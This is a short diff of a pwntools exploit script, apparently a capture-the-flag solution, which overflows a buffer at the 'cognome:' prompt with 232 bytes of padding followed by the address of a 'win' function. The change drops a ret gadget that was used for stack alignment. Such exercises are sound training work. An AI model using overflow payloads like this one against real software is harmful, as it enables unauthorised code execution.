@@ -40,7 +40,7 @@ continue
 io = start()
 
 io.sendlineafter(b"nome:", b"nome")
-io.sendlineafter(b"cognome:", b"A"*232+p64(0x000000000040101a)+p64(exe.sym.win))
+io.sendlineafter(b"cognome:", b"A"*232+p64(exe.sym.win))
 
 io.interactive()
 
